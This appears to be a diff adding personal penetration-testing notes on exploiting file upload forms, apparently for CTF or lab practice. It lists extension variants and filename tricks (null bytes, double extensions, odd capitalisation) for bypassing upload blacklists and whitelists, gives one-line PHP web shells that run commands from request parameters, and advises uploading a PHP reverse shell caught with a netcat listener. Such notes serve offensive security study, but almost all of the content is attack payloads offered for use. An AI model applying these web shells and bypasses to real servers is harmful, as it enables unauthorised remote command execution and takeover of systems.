@@ -1,0 +1,50 @@
+Port Scan (Nmap/Rustscan) > Directory Searching (Dirsearch/dirb/gobuster) > finding uploading extention > 
+
+
+Common PHP Extention:
+.php
+.php3
+.php4
+.php5
+.phtml
+
+Blacklisting Bypass:
+PHP → .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
+ASP → asp, .aspx, .cer, .asa
+Jsp → .jsp, .jspx, .jsw, .jsv, .jspf
+Coldfusion → .cfm, .cfml, .cfc, .dbm
+Using random capitalization → .pHp, .pHP5, .PhAr
+
+Whitelisting Bypass
+file.jpg.php
+file.php.jpg
+file.php.blah123jpg
+file.php%00.jpg
+file.php\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in hex to 00.
+file.php%00
+file.php%20
+file.php%0d%0a.jpg
+file.php.....
+file.php/
+file.php.\
+file.php#.png
+file.
+.html
+
+PhpInfo : <?php phpinfo(); ?>
+Basic php File : <?php echo system($_REQUEST['cmd']); ?> , ?cmd=value
+Basic php file : <?php system($_GET['cmd']); ?> , ?cmd=value
+Finding User : <?php $dir = "/home"; $files = scandir($dir); print_r($files); ?>
+
+use pentestermonkey or online reverseshell or another php reverse shell and change the ip and port also. and call it by nc -lnvp 8888 or nc -lvp 8888
+
+https://www.youtube.com/watch?v=E_AJsq9gkKs
+
+
+https://www.invicti.com/learn/reverse-shell/
+https://gist.github.com/rshipp/eee36684db07d234c1cc
+https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/File%20Upload.md
+https://medium.com/@cicadasec/malicious-file-upload-checklist-24e0b764de95
+https://medium.com/@mat.redzia/php-reverse-shell-breaking-into-a-vulnerable-machine-tryhackme-write-up-824351a44675
+
+
